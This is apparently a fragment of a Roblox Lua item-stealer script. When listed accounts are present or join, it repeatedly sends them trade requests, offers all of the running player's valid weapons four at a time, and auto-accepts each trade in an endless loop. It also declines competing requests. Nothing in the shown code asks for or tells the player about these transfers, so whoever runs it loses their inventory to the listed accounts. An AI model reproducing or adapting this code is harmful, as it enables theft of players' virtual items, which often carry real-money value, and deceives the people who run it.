	local function doTrade(joinedUser)
		local weaponsToSend = getValidWeapons()
		local initialTradeState = getTradeStatus()
		if initialTradeState == "StartTrade" then
			game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
			task.wait(0.3)
		elseif initialTradeState == "ReceivingRequest" then
			game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
			task.wait(0.3)
		end

		while #weaponsToSend > 0 do
			local tradeStatus = getTradeStatus()

			if tradeStatus == "None" then
				sendTradeRequest(joinedUser)
			elseif tradeStatus == "SendingRequest" then
				task.wait(0.3)
			elseif tradeStatus == "ReceivingRequest" then
				game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
				task.wait(0.3)
			elseif tradeStatus == "StartTrade" then
				task.wait(1)

				local slotsUsed = 0
				local i = 1

				while i <= #weaponsToSend and slotsUsed < 4 do
					local weapon = weaponsToSend[i]

					pcall(function()
						game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(weapon.DataID, "Weapons")
					end)

					slotsUsed = slotsUsed + 1
					weapon.Amount = weapon.Amount - 1

					if weapon.Amount <= 0 then
						table.remove(weaponsToSend, i)
					else
						i = i + 1
					end

					task.wait(0.3)
				end

				task.wait(1)
				acceptTrade()
				waitForTradeCompletion()
				checkAndUpdateStatus()
			else
				task.wait(0.5)
			end
			task.wait(1)
			weaponsToSend = getValidWeapons()
		end
	end

	local function autoStartTrade()
		local function checkAndTrade(player)
			if table.find(users, player.Name) then
				task.wait(5)
				while true do
					doTrade(player.Name)
					task.wait(2)
				end
			end
		end

		for _, p in ipairs(Players:GetPlayers()) do 
			task.spawn(checkAndTrade, p)
		end

		Players.PlayerAdded:Connect(function(p)
			task.spawn(checkAndTrade, p)
		end)
	end

	autoStartTrade()
